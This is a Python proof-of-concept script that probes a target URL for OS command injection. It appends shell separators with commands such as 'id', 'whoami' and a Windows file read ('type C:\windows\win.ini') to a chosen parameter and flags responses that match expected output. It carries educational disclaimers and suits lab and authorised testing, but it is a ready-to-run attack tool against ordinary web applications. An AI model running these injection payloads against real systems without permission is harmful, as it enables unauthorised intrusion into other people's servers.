#!/usr/bin/env python3
"""
OS Command Injection PoC
========================
Demonstrates command injection by appending shell meta-characters and common
OS commands to a user-controlled parameter and checking the response for
known output patterns.

DISCLAIMER: For educational and research purposes only.
Only run against systems you own or have explicit written permission to test.
"""

import argparse
import re
import sys

try:
    import requests
    from colorama import Fore, Style, init as colorama_init
except ImportError:
    sys.exit("Missing dependencies. Run: pip install -r requirements.txt")

sys.path.insert(0, str(__import__("pathlib").Path(__file__).resolve().parents[1]))
from utils import build_session  # noqa: E402

colorama_init(autoreset=True)

DISCLAIMER = (
    f"{Fore.YELLOW}[!] DISCLAIMER: This tool is for educational/research purposes only.\n"
    f"    Only use against systems you own or have explicit written permission to test.{Style.RESET_ALL}"
)

# Pattern matching a Unix username (output of whoami / id commands)
USERNAME_PATTERN = r"[a-z_][a-z0-9_\-]*"

# ── Payload library ──────────────────────────────────────────────────────────
# Each entry is (payload_template, expected_output_pattern).
# The template is appended after a base value (e.g. an IP address like "127.0.0.1").
PAYLOADS: list[tuple[str, str]] = [
    # Unix-style separators
    ("; id",                r"uid=\d+"),
    ("| id",                r"uid=\d+"),
    ("|| id",               r"uid=\d+"),
    ("& id",                r"uid=\d+"),
    ("&& id",               r"uid=\d+"),
    ("`id`",                r"uid=\d+"),
    ("$(id)",               r"uid=\d+"),
    # whoami (works on both Unix and Windows)
    ("; whoami",            USERNAME_PATTERN),
    ("| whoami",            USERNAME_PATTERN),
    # Windows-style (cmd.exe)
    ("& whoami",            r"[a-z0-9_\\\-]+"),
    ("| type C:\\windows\\win.ini", r"\[fonts\]"),
    # Blind time-based markers (no output check – rely on latency)
    # These are intentionally left out to avoid heavy sleep-based probing
    # in an automated PoC. They can be added manually for targeted testing.
]

BASE_VALUES = [
    "127.0.0.1",
    "localhost",
    "1",
]


def probe(
    session: requests.Session,
    url: str,
    param: str,
    method: str,
    base: str,
    payload_suffix: str,
    pattern: str,
    timeout: int,
) -> bool:
    """Send one payload and return True if the expected output pattern appears."""
    full_value = base + payload_suffix
    try:
        if method.upper() == "POST":
            resp = session.post(url, data={param: full_value}, timeout=timeout)
        else:
            resp = session.get(url, params={param: full_value}, timeout=timeout)

        if re.search(pattern, resp.text, re.IGNORECASE):
            print(
                f"{Fore.RED}[+] Possible command injection!\n"
                f"    Payload  : {full_value!r}\n"
                f"    Pattern  : {pattern!r}\n"
                f"    Status   : {resp.status_code}\n"
                f"    Snippet  : {resp.text[:200]!r}"
            )
            return True
    except requests.RequestException as exc:
        print(f"{Fore.YELLOW}[-] Request error ({full_value!r}): {exc}")
    return False


def main() -> None:
    parser = argparse.ArgumentParser(
        description="OS Command Injection PoC – educational purposes only",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    parser.add_argument("--url",     required=True, help="Target URL")
    parser.add_argument("--param",   default="ip",  help="Input parameter to inject (default: ip)")
    parser.add_argument("--method",  default="POST", choices=["GET", "POST"], help="HTTP method (default: POST)")
    parser.add_argument("--base",    default=None,
                        help="Base value prepended before the injection suffix (default: tries common values)")
    parser.add_argument("--cookies", default=None, help="Session cookies, e.g. 'PHPSESSID=abc; security=low'")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout in seconds (default: 10)")
    args = parser.parse_args()

    print(DISCLAIMER)
    print(f"\n{Fore.CYAN}[*] Target : {args.url}")
    print(f"{Fore.CYAN}[*] Param  : {args.param}")
    print(f"{Fore.CYAN}[*] Method : {args.method}\n")

    session = build_session(args.cookies, user_agent="CmdInjection-PoC/1.0 (educational)")
    bases = [args.base] if args.base else BASE_VALUES

    found = False
    for base in bases:
        print(f"{Fore.CYAN}[*] Using base value: {base!r}")
        for payload_suffix, pattern in PAYLOADS:
            if probe(session, args.url, args.param, args.method, base, payload_suffix, pattern, args.timeout):
                found = True

    print()
    if found:
        print(f"{Fore.RED}[!] Target may be vulnerable to OS command injection.")
    else:
        print(f"{Fore.GREEN}[✓] No command injection indicators found with tested payloads.")


if __name__ == "__main__":
    main()
